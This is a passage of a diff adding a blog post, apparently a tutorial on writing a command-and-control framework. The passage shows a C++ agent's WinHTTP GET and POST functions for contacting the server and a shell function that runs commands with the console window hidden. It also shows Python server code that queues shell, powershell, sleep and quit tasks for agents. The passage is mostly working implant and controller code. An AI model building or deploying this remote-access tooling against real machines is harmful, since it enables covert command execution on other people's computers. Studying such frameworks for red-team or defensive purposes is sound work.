+        <span class="n">hRequest</span> <span class="o">=</span> <span class="n">WinHttpOpenRequest</span><span class="p">(</span><span class="n">hConnect</span><span class="p">,</span>
+                                      <span class="s">L"GET"</span><span class="p">,</span> <span class="n">suri</span><span class="p">.</span><span class="n">c_str</span><span class="p">(),</span>
+                                      <span class="nb">NULL</span><span class="p">,</span>
+                                      <span class="n">WINHTTP_NO_REFERER</span><span class="p">,</span>
+                                      <span class="n">WINHTTP_DEFAULT_ACCEPT_TYPES</span><span class="p">,</span>
+                                      <span class="mi">0</span><span class="p">);</span>
+    <span class="p">}</span>
+
+    <span class="k">if</span> <span class="p">(</span><span class="n">hRequest</span><span class="p">)</span> <span class="p">{</span>
+
+        <span class="n">bResults</span> <span class="o">=</span> <span class="n">WinHttpSendRequest</span><span class="p">(</span><span class="n">hRequest</span><span class="p">,</span>
+                                      <span class="n">WINHTTP_NO_ADDITIONAL_HEADERS</span><span class="p">,</span>
+                                      <span class="mi">0</span><span class="p">,</span>
+                                      <span class="n">WINHTTP_NO_REQUEST_DATA</span><span class="p">,</span>
+                                      <span class="mi">0</span><span class="p">,</span>
+                                      <span class="mi">0</span><span class="p">,</span>
+                                      <span class="mi">0</span><span class="p">);</span>
+    <span class="p">}</span>
+
+    <span class="k">if</span> <span class="p">(</span><span class="n">bResults</span><span class="p">)</span> <span class="p">{</span>
+
+        <span class="n">bResults</span> <span class="o">=</span> <span class="n">WinHttpReceiveResponse</span><span class="p">(</span><span class="n">hRequest</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
+    <span class="p">}</span>
+
+    <span class="k">if</span> <span class="p">(</span><span class="n">bResults</span><span class="p">)</span>
+    <span class="p">{</span>
+        <span class="k">do</span>
+        <span class="p">{</span>
+            <span class="n">dwSize</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+            <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">WinHttpQueryDataAvailable</span><span class="p">(</span><span class="n">hRequest</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">dwSize</span><span class="p">)){}</span>
+
+            <span class="n">pszOutBuffer</span> <span class="o">=</span> <span class="k">new</span> <span class="kt">char</span><span class="p">[</span><span class="n">dwSize</span> <span class="o">+</span> <span class="mi">1</span><span class="p">];</span>
+            <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">pszOutBuffer</span><span class="p">)</span>
+            <span class="p">{</span>
+                <span class="n">dwSize</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+            <span class="p">}</span>
+            <span class="k">else</span>
+            <span class="p">{</span>
+                <span class="n">ZeroMemory</span><span class="p">(</span><span class="n">pszOutBuffer</span><span class="p">,</span> <span class="n">dwSize</span> <span class="o">+</span> <span class="mi">1</span><span class="p">);</span>
+
+                <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">WinHttpReadData</span><span class="p">(</span><span class="n">hRequest</span><span class="p">,</span> <span class="p">(</span><span class="n">LPVOID</span><span class="p">)</span><span class="n">pszOutBuffer</span><span class="p">,</span> <span class="n">dwSize</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">dwDownloaded</span><span class="p">))</span> <span class="p">{}</span>
+                <span class="k">else</span> <span class="p">{</span>
+                    
+                    <span class="n">response</span> <span class="o">=</span> <span class="n">response</span> <span class="o">+</span> <span class="n">std</span><span class="o">::</span><span class="n">string</span><span class="p">(</span><span class="n">pszOutBuffer</span><span class="p">);</span>
+                    <span class="k">delete</span><span class="p">[]</span> <span class="n">pszOutBuffer</span><span class="p">;</span>
+                <span class="p">}</span>
+            <span class="p">}</span>
+        <span class="p">}</span> <span class="k">while</span> <span class="p">(</span><span class="n">dwSize</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">);</span>
+    <span class="p">}</span>
+
+    <span class="k">if</span> <span class="p">(</span><span class="n">hRequest</span><span class="p">)</span> <span class="n">WinHttpCloseHandle</span><span class="p">(</span><span class="n">hRequest</span><span class="p">);</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">hConnect</span><span class="p">)</span> <span class="n">WinHttpCloseHandle</span><span class="p">(</span><span class="n">hConnect</span><span class="p">);</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">hSession</span><span class="p">)</span> <span class="n">WinHttpCloseHandle</span><span class="p">(</span><span class="n">hSession</span><span class="p">);</span>
+
+    <span class="k">return</span> <span class="n">response</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="n">std</span><span class="o">::</span><span class="n">string</span> <span class="nf">Post</span><span class="p">(</span><span class="n">std</span><span class="o">::</span><span class="n">string</span> <span class="n">ip</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">port</span><span class="p">,</span> <span class="n">std</span><span class="o">::</span><span class="n">string</span> <span class="n">uri</span><span class="p">,</span> <span class="n">std</span><span class="o">::</span><span class="n">string</span> <span class="n">dat</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="n">LPSTR</span> <span class="n">data</span>     <span class="o">=</span> <span class="k">const_cast</span><span class="o">&lt;</span><span class="kt">char</span><span class="o">*&gt;</span><span class="p">(</span><span class="n">dat</span><span class="p">.</span><span class="n">c_str</span><span class="p">());;</span>
+    <span class="n">DWORD</span> <span class="n">data_len</span> <span class="o">=</span> <span class="n">strlen</span><span class="p">(</span><span class="n">data</span><span class="p">);</span>
+
+    <span class="n">LPCWSTR</span> <span class="n">additionalHeaders</span> <span class="o">=</span> <span class="s">L"Content-Type: application/x-www-form-urlencoded</span><span class="se">\r\n</span><span class="s">"</span><span class="p">;</span>
+    <span class="n">DWORD</span> <span class="n">headersLength</span>       <span class="o">=</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
+
+    <span class="n">std</span><span class="o">::</span><span class="n">wstring</span> <span class="n">sip</span>     <span class="o">=</span> <span class="n">get_utf16</span><span class="p">(</span><span class="n">ip</span><span class="p">,</span> <span class="n">CP_UTF8</span><span class="p">);</span>
+    <span class="n">std</span><span class="o">::</span><span class="n">wstring</span> <span class="n">suri</span>    <span class="o">=</span> <span class="n">get_utf16</span><span class="p">(</span><span class="n">uri</span><span class="p">,</span> <span class="n">CP_UTF8</span><span class="p">);</span>
+
+    <span class="n">std</span><span class="o">::</span><span class="n">string</span> <span class="n">response</span><span class="p">;</span>
+
+    <span class="n">LPSTR</span> <span class="n">pszOutBuffer</span><span class="p">;</span>
+
+    <span class="n">DWORD</span> <span class="n">dwSize</span>       <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+    <span class="n">DWORD</span> <span class="n">dwDownloaded</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+    <span class="n">BOOL</span>  <span class="n">bResults</span>     <span class="o">=</span> <span class="n">FALSE</span><span class="p">;</span>
+ 
+    <span class="n">HINTERNET</span> <span class="n">hSession</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">,</span>
+              <span class="n">hConnect</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">,</span>
+              <span class="n">hRequest</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
+
+    <span class="n">hSession</span> <span class="o">=</span> <span class="n">WinHttpOpen</span><span class="p">(</span><span class="s">L"test"</span><span class="p">,</span>
+                           <span class="n">WINHTTP_ACCESS_TYPE_DEFAULT_PROXY</span><span class="p">,</span>
+                           <span class="n">WINHTTP_NO_PROXY_NAME</span><span class="p">,</span>
+                           <span class="n">WINHTTP_NO_PROXY_BYPASS</span><span class="p">,</span>
+                           <span class="mi">0</span><span class="p">);</span>
+
+    <span class="k">if</span> <span class="p">(</span><span class="n">hSession</span><span class="p">)</span> <span class="p">{</span>
+
+        <span class="n">hConnect</span> <span class="o">=</span> <span class="n">WinHttpConnect</span><span class="p">(</span><span class="n">hSession</span><span class="p">,</span>
+                                  <span class="n">sip</span><span class="p">.</span><span class="n">c_str</span><span class="p">(),</span>
+                                  <span class="n">port</span><span class="p">,</span>
+                                  <span class="mi">0</span><span class="p">);</span>
+    <span class="p">}</span>
+
+    <span class="k">if</span> <span class="p">(</span><span class="n">hConnect</span><span class="p">)</span> <span class="p">{</span>
+
+        <span class="n">hRequest</span> <span class="o">=</span> <span class="n">WinHttpOpenRequest</span><span class="p">(</span><span class="n">hConnect</span><span class="p">,</span>
+                                      <span class="s">L"POST"</span><span class="p">,</span> <span class="n">suri</span><span class="p">.</span><span class="n">c_str</span><span class="p">(),</span>
+                                      <span class="nb">NULL</span><span class="p">,</span>
+                                      <span class="n">WINHTTP_NO_REFERER</span><span class="p">,</span>
+                                      <span class="n">WINHTTP_DEFAULT_ACCEPT_TYPES</span><span class="p">,</span>
+                                      <span class="mi">0</span><span class="p">);</span>
+    <span class="p">}</span>
+
+    <span class="k">if</span> <span class="p">(</span><span class="n">hRequest</span><span class="p">)</span> <span class="p">{</span>
+
+        <span class="n">bResults</span> <span class="o">=</span> <span class="n">WinHttpSendRequest</span><span class="p">(</span><span class="n">hRequest</span><span class="p">,</span>
+                                      <span class="n">additionalHeaders</span><span class="p">,</span>
+                                      <span class="n">headersLength</span><span class="p">,</span>
+                                      <span class="p">(</span><span class="n">LPVOID</span><span class="p">)</span><span class="n">data</span><span class="p">,</span>
+                                      <span class="n">data_len</span><span class="p">,</span>
+                                      <span class="n">data_len</span><span class="p">,</span>
+                                      <span class="mi">0</span><span class="p">);</span>
+    <span class="p">}</span>
+
+    <span class="k">if</span> <span class="p">(</span><span class="n">bResults</span><span class="p">)</span> <span class="p">{</span>
+
+        <span class="n">bResults</span> <span class="o">=</span> <span class="n">WinHttpReceiveResponse</span><span class="p">(</span><span class="n">hRequest</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
+    <span class="p">}</span>
+
+    <span class="k">if</span> <span class="p">(</span><span class="n">bResults</span><span class="p">)</span>
+    <span class="p">{</span>
+        <span class="k">do</span>
+        <span class="p">{</span>
+            <span class="n">dwSize</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+            <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">WinHttpQueryDataAvailable</span><span class="p">(</span><span class="n">hRequest</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">dwSize</span><span class="p">)){}</span>
+
+            <span class="n">pszOutBuffer</span> <span class="o">=</span> <span class="k">new</span> <span class="kt">char</span><span class="p">[</span><span class="n">dwSize</span> <span class="o">+</span> <span class="mi">1</span><span class="p">];</span>
+            <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">pszOutBuffer</span><span class="p">)</span>
+            <span class="p">{</span>
+                <span class="n">dwSize</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+            <span class="p">}</span>
+            <span class="k">else</span>
+            <span class="p">{</span>
+                <span class="n">ZeroMemory</span><span class="p">(</span><span class="n">pszOutBuffer</span><span class="p">,</span> <span class="n">dwSize</span> <span class="o">+</span> <span class="mi">1</span><span class="p">);</span>
+
+                <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">WinHttpReadData</span><span class="p">(</span><span class="n">hRequest</span><span class="p">,</span> <span class="p">(</span><span class="n">LPVOID</span><span class="p">)</span><span class="n">pszOutBuffer</span><span class="p">,</span> <span class="n">dwSize</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">dwDownloaded</span><span class="p">))</span> <span class="p">{}</span>
+                <span class="k">else</span> <span class="p">{</span>
+                    
+                    <span class="n">response</span> <span class="o">=</span> <span class="n">response</span> <span class="o">+</span> <span class="n">std</span><span class="o">::</span><span class="n">string</span><span class="p">(</span><span class="n">pszOutBuffer</span><span class="p">);</span>
+                    <span class="k">delete</span><span class="p">[]</span> <span class="n">pszOutBuffer</span><span class="p">;</span>
+                <span class="p">}</span>
+            <span class="p">}</span>
+        <span class="p">}</span> <span class="k">while</span> <span class="p">(</span><span class="n">dwSize</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">);</span>
+    <span class="p">}</span>
+
+    <span class="k">if</span> <span class="p">(</span><span class="n">hRequest</span><span class="p">)</span> <span class="n">WinHttpCloseHandle</span><span class="p">(</span><span class="n">hRequest</span><span class="p">);</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">hConnect</span><span class="p">)</span> <span class="n">WinHttpCloseHandle</span><span class="p">(</span><span class="n">hConnect</span><span class="p">);</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">hSession</span><span class="p">)</span> <span class="n">WinHttpCloseHandle</span><span class="p">(</span><span class="n">hSession</span><span class="p">);</span>
+
+    <span class="k">return</span> <span class="n">response</span><span class="p">;</span>
+
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>The <code class="language-plaintext highlighter-rouge">shell</code> function does the almost the same thing as the <code class="language-plaintext highlighter-rouge">shell</code> function in the other agent, some of the code is taken from Stack Overflow and I edited it:</p>
+
+<div class="language-c++ highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+<span class="n">CStringA</span> <span class="nf">shell</span><span class="p">(</span><span class="k">const</span> <span class="kt">wchar_t</span><span class="o">*</span> <span class="n">cmd</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="n">CStringA</span> <span class="n">result</span><span class="p">;</span>
+    <span class="n">HANDLE</span> <span class="n">hPipeRead</span><span class="p">,</span> <span class="n">hPipeWrite</span><span class="p">;</span>
+
+    <span class="n">SECURITY_ATTRIBUTES</span> <span class="n">saAttr</span> <span class="o">=</span> <span class="p">{</span><span class="k">sizeof</span><span class="p">(</span><span class="n">SECURITY_ATTRIBUTES</span><span class="p">)};</span>
+    <span class="n">saAttr</span><span class="p">.</span><span class="n">bInheritHandle</span> <span class="o">=</span> <span class="n">TRUE</span><span class="p">;</span> 
+    <span class="n">saAttr</span><span class="p">.</span><span class="n">lpSecurityDescriptor</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
+
+    
+    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">CreatePipe</span><span class="p">(</span><span class="o">&amp;</span><span class="n">hPipeRead</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">hPipeWrite</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">saAttr</span><span class="p">,</span> <span class="mi">0</span><span class="p">))</span>
+        <span class="k">return</span> <span class="n">result</span><span class="p">;</span>
+
+    <span class="n">STARTUPINFOW</span> <span class="n">si</span> <span class="o">=</span> <span class="p">{</span><span class="k">sizeof</span><span class="p">(</span><span class="n">STARTUPINFOW</span><span class="p">)};</span>
+    <span class="n">si</span><span class="p">.</span><span class="n">dwFlags</span>     <span class="o">=</span> <span class="n">STARTF_USESHOWWINDOW</span> <span class="o">|</span> <span class="n">STARTF_USESTDHANDLES</span><span class="p">;</span>
+    <span class="n">si</span><span class="p">.</span><span class="n">hStdOutput</span>  <span class="o">=</span> <span class="n">hPipeWrite</span><span class="p">;</span>
+    <span class="n">si</span><span class="p">.</span><span class="n">hStdError</span>   <span class="o">=</span> <span class="n">hPipeWrite</span><span class="p">;</span>
+    <span class="n">si</span><span class="p">.</span><span class="n">wShowWindow</span> <span class="o">=</span> <span class="n">SW_HIDE</span><span class="p">;</span> 
+
+    <span class="n">PROCESS_INFORMATION</span> <span class="n">pi</span> <span class="o">=</span> <span class="p">{</span> <span class="mi">0</span> <span class="p">};</span>
+
+    <span class="n">BOOL</span> <span class="n">fSuccess</span> <span class="o">=</span> <span class="n">CreateProcessW</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span> <span class="p">(</span><span class="n">LPWSTR</span><span class="p">)</span><span class="n">cmd</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">TRUE</span><span class="p">,</span> <span class="n">CREATE_NEW_CONSOLE</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">si</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">pi</span><span class="p">);</span>
+    <span class="k">if</span> <span class="p">(</span><span class="o">!</span> <span class="n">fSuccess</span><span class="p">)</span>
+    <span class="p">{</span>
+        <span class="n">CloseHandle</span><span class="p">(</span><span class="n">hPipeWrite</span><span class="p">);</span>
+        <span class="n">CloseHandle</span><span class="p">(</span><span class="n">hPipeRead</span><span class="p">);</span>
+        <span class="k">return</span> <span class="n">result</span><span class="p">;</span>
+    <span class="p">}</span>
+
+    <span class="kt">bool</span> <span class="n">bProcessEnded</span> <span class="o">=</span> <span class="nb">false</span><span class="p">;</span>
+    <span class="k">for</span> <span class="p">(;</span> <span class="o">!</span><span class="n">bProcessEnded</span> <span class="p">;)</span>
+    <span class="p">{</span>
+        <span class="n">bProcessEnded</span> <span class="o">=</span> <span class="n">WaitForSingleObject</span><span class="p">(</span> <span class="n">pi</span><span class="p">.</span><span class="n">hProcess</span><span class="p">,</span> <span class="mi">50</span><span class="p">)</span> <span class="o">==</span> <span class="n">WAIT_OBJECT_0</span><span class="p">;</span>
+
+        <span class="k">for</span> <span class="p">(;;)</span>
+        <span class="p">{</span>
+            <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">1024</span><span class="p">];</span>
+            <span class="n">DWORD</span> <span class="n">dwRead</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+            <span class="n">DWORD</span> <span class="n">dwAvail</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+
+            <span class="k">if</span> <span class="p">(</span><span class="o">!::</span><span class="n">PeekNamedPipe</span><span class="p">(</span><span class="n">hPipeRead</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">dwAvail</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">))</span>
+                <span class="k">break</span><span class="p">;</span>
+
+            <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">dwAvail</span><span class="p">)</span>
+                <span class="k">break</span><span class="p">;</span>
+
+            <span class="k">if</span> <span class="p">(</span><span class="o">!::</span><span class="n">ReadFile</span><span class="p">(</span><span class="n">hPipeRead</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="n">min</span><span class="p">(</span><span class="k">sizeof</span><span class="p">(</span><span class="n">buf</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span><span class="p">,</span> <span class="n">dwAvail</span><span class="p">),</span> <span class="o">&amp;</span><span class="n">dwRead</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">)</span> <span class="o">||</span> <span class="o">!</span><span class="n">dwRead</span><span class="p">)</span>
+                <span class="k">break</span><span class="p">;</span>
+
+            <span class="n">buf</span><span class="p">[</span><span class="n">dwRead</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+            <span class="n">result</span> <span class="o">+=</span> <span class="n">buf</span><span class="p">;</span>
+        <span class="p">}</span>
+    <span class="p">}</span>
+
+    <span class="n">CloseHandle</span><span class="p">(</span><span class="n">hPipeWrite</span><span class="p">);</span>
+    <span class="n">CloseHandle</span><span class="p">(</span><span class="n">hPipeRead</span><span class="p">);</span>
+    <span class="n">CloseHandle</span><span class="p">(</span><span class="n">pi</span><span class="p">.</span><span class="n">hProcess</span><span class="p">);</span>
+    <span class="n">CloseHandle</span><span class="p">(</span><span class="n">pi</span><span class="p">.</span><span class="n">hThread</span><span class="p">);</span>
+    <span class="k">return</span> <span class="n">result</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>I would like to point out an important option in the process created by the <code class="language-plaintext highlighter-rouge">shell</code> function which is:</p>
+
+<div class="language-c++ highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">si</span><span class="p">.</span><span class="n">wShowWindow</span> <span class="o">=</span> <span class="n">SW_HIDE</span><span class="p">;</span> 
+</code></pre></div></div>
+
+<p>This is responsible for hiding the console window, this is also added in the <code class="language-plaintext highlighter-rouge">main()</code> function of the agent to hide the console window:</p>
+
+<div class="language-c++ highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="k">const</span> <span class="o">*</span><span class="n">argv</span><span class="p">[])</span> 
+<span class="p">{</span>
+
+    <span class="n">ShowWindow</span><span class="p">(</span><span class="n">GetConsoleWindow</span><span class="p">(),</span> <span class="n">SW_HIDE</span><span class="p">);</span>
+    <span class="p">...</span>
+</code></pre></div></div>
+
+<h2 id="agent-handler">Agent Handler</h2>
+
+<p>Now that we’ve talked about the agents, let’s go back to the server and take a look at the agent handler.<br></p>
+
+<p>An <code class="language-plaintext highlighter-rouge">Agent</code> object is instantiated with a name, a listener name, a remote address, a hostname, a type and an encryption key:</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">class</span> <span class="nc">Agent</span><span class="p">:</span>
+
+    <span class="k">def</span> <span class="nf">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">name</span><span class="p">,</span> <span class="n">listener</span><span class="p">,</span> <span class="n">remoteip</span><span class="p">,</span> <span class="n">hostname</span><span class="p">,</span> <span class="n">Type</span><span class="p">,</span> <span class="n">key</span><span class="p">):</span>
+
+        <span class="bp">self</span><span class="p">.</span><span class="n">name</span>      <span class="o">=</span> <span class="n">name</span>
+        <span class="bp">self</span><span class="p">.</span><span class="n">listener</span>  <span class="o">=</span> <span class="n">listener</span>
+        <span class="bp">self</span><span class="p">.</span><span class="n">remoteip</span>  <span class="o">=</span> <span class="n">remoteip</span>
+        <span class="bp">self</span><span class="p">.</span><span class="n">hostname</span>  <span class="o">=</span> <span class="n">hostname</span>
+        <span class="bp">self</span><span class="p">.</span><span class="n">Type</span>      <span class="o">=</span> <span class="n">Type</span>
+        <span class="bp">self</span><span class="p">.</span><span class="n">key</span>       <span class="o">=</span> <span class="n">key</span>
+</code></pre></div></div>
+
+<p>Then it defines the sleep time which is 3 seconds by default as discussed, it needs to keep track of the sleep time to be able to determine if an agent is dead or not when removing an agent, otherwise it will keep waiting for the agent to call forever:</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="bp">self</span><span class="p">.</span><span class="n">sleept</span>    <span class="o">=</span> <span class="mi">3</span>
+</code></pre></div></div>
+
+<p>After that it creates the needed directories and files:</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="bp">self</span><span class="p">.</span><span class="n">Path</span>      <span class="o">=</span> <span class="s">"data/listeners/{}/agents/{}/"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="bp">self</span><span class="p">.</span><span class="n">listener</span><span class="p">,</span> <span class="bp">self</span><span class="p">.</span><span class="n">name</span><span class="p">)</span>
+<span class="bp">self</span><span class="p">.</span><span class="n">tasksPath</span> <span class="o">=</span> <span class="s">"{}tasks"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="bp">self</span><span class="p">.</span><span class="n">Path</span><span class="p">,</span> <span class="bp">self</span><span class="p">.</span><span class="n">name</span><span class="p">)</span>
+
+<span class="k">if</span> <span class="n">os</span><span class="p">.</span><span class="n">path</span><span class="p">.</span><span class="n">exists</span><span class="p">(</span><span class="bp">self</span><span class="p">.</span><span class="n">Path</span><span class="p">)</span> <span class="o">==</span> <span class="bp">False</span><span class="p">:</span>
+    <span class="n">os</span><span class="p">.</span><span class="n">mkdir</span><span class="p">(</span><span class="bp">self</span><span class="p">.</span><span class="n">Path</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>And finally it creates the menu for the agent, but I won’t cover the <code class="language-plaintext highlighter-rouge">Menu</code> class in this post because it doesn’t relate to the core functionality of the tool.<br></p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="bp">self</span><span class="p">.</span><span class="n">menu</span> <span class="o">=</span> <span class="n">menu</span><span class="p">.</span><span class="n">Menu</span><span class="p">(</span><span class="bp">self</span><span class="p">.</span><span class="n">name</span><span class="p">)</span>
+        
+<span class="bp">self</span><span class="p">.</span><span class="n">menu</span><span class="p">.</span><span class="n">registerCommand</span><span class="p">(</span><span class="s">"shell"</span><span class="p">,</span> <span class="s">"Execute a shell command."</span><span class="p">,</span> <span class="s">"&lt;command&gt;"</span><span class="p">)</span>
+<span class="bp">self</span><span class="p">.</span><span class="n">menu</span><span class="p">.</span><span class="n">registerCommand</span><span class="p">(</span><span class="s">"powershell"</span><span class="p">,</span> <span class="s">"Execute a powershell command."</span><span class="p">,</span> <span class="s">"&lt;command&gt;"</span><span class="p">)</span>
+<span class="bp">self</span><span class="p">.</span><span class="n">menu</span><span class="p">.</span><span class="n">registerCommand</span><span class="p">(</span><span class="s">"sleep"</span><span class="p">,</span> <span class="s">"Change agent's sleep time."</span><span class="p">,</span> <span class="s">"&lt;time (s)&gt;"</span><span class="p">)</span>
+<span class="bp">self</span><span class="p">.</span><span class="n">menu</span><span class="p">.</span><span class="n">registerCommand</span><span class="p">(</span><span class="s">"clear"</span><span class="p">,</span> <span class="s">"Clear tasks."</span><span class="p">,</span> <span class="s">""</span><span class="p">)</span>
+<span class="bp">self</span><span class="p">.</span><span class="n">menu</span><span class="p">.</span><span class="n">registerCommand</span><span class="p">(</span><span class="s">"quit"</span><span class="p">,</span> <span class="s">"Task agent to quit."</span><span class="p">,</span> <span class="s">""</span><span class="p">)</span>
+
+<span class="bp">self</span><span class="p">.</span><span class="n">menu</span><span class="p">.</span><span class="n">uCommands</span><span class="p">()</span>
+
+<span class="bp">self</span><span class="p">.</span><span class="n">Commands</span> <span class="o">=</span> <span class="bp">self</span><span class="p">.</span><span class="n">menu</span><span class="p">.</span><span class="n">Commands</span>
+</code></pre></div></div>
+
+<p>I won’t talk about the wrapper functions because we only care about the core functions.<br></p>
+
+<p>First function is the <code class="language-plaintext highlighter-rouge">writeTask()</code> function, which is a quite simple function, it takes the task and prepends it with the <code class="language-plaintext highlighter-rouge">VALID</code> flag then it writes it to the tasks path:</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">writeTask</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">task</span><span class="p">):</span>
+    
+    <span class="k">if</span> <span class="bp">self</span><span class="p">.</span><span class="n">Type</span> <span class="o">==</span> <span class="s">"p"</span><span class="p">:</span>
+        <span class="n">task</span> <span class="o">=</span> <span class="s">"VALID "</span> <span class="o">+</span> <span class="n">task</span>
+        <span class="n">task</span> <span class="o">=</span> <span class="n">ENCRYPT</span><span class="p">(</span><span class="n">task</span><span class="p">,</span> <span class="bp">self</span><span class="p">.</span><span class="n">key</span><span class="p">)</span>
+    <span class="k">elif</span> <span class="bp">self</span><span class="p">.</span><span class="n">Type</span> <span class="o">==</span> <span class="s">"w"</span><span class="p">:</span>
+        <span class="n">task</span> <span class="o">=</span> <span class="n">task</span>
+	
+    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="bp">self</span><span class="p">.</span><span class="n">tasksPath</span><span class="p">,</span> <span class="s">"w"</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+            <span class="n">f</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="n">task</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>As you can see, it only encrypts the task in case of <code class="language-plaintext highlighter-rouge">powershell</code> agent only, that’s because there’s no encryption in the <code class="language-plaintext highlighter-rouge">c++</code> agent (more on that in the encryption part).<br></p>
+
+<p>Second function I want to talk about is the <code class="language-plaintext highlighter-rouge">clearTasks()</code> function which just deletes the <code class="language-plaintext highlighter-rouge">tasks</code> file, very simple:</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">clearTasks</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+    
+    <span class="k">if</span> <span class="n">os</span><span class="p">.</span><span class="n">path</span><span class="p">.</span><span class="n">exists</span><span class="p">(</span><span class="bp">self</span><span class="p">.</span><span class="n">tasksPath</span><span class="p">):</span>
+        <span class="n">os</span><span class="p">.</span><span class="n">remove</span><span class="p">(</span><span class="bp">self</span><span class="p">.</span><span class="n">tasksPath</span><span class="p">)</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="k">pass</span>
+</code></pre></div></div>
+
+<p>Third function is a very important function called <code class="language-plaintext highlighter-rouge">update()</code>, this function gets called when an agent is renamed and it updates the paths. As seen earlier, the paths depend on the agent’s name, so without calling this function the agent won’t be able to download its tasks.<br></p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">update</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+    
+    <span class="bp">self</span><span class="p">.</span><span class="n">menu</span><span class="p">.</span><span class="n">name</span> <span class="o">=</span> <span class="bp">self</span><span class="p">.</span><span class="n">name</span>
+    <span class="bp">self</span><span class="p">.</span><span class="n">Path</span>      <span class="o">=</span> <span class="s">"data/listeners/{}/agents/{}/"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="bp">self</span><span class="p">.</span><span class="n">listener</span><span class="p">,</span> <span class="bp">self</span><span class="p">.</span><span class="n">name</span><span class="p">)</span>
+    <span class="bp">self</span><span class="p">.</span><span class="n">tasksPath</span> <span class="o">=</span> <span class="s">"{}tasks"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="bp">self</span><span class="p">.</span><span class="n">Path</span><span class="p">,</span> <span class="bp">self</span><span class="p">.</span><span class="n">name</span><span class="p">)</span>
+        
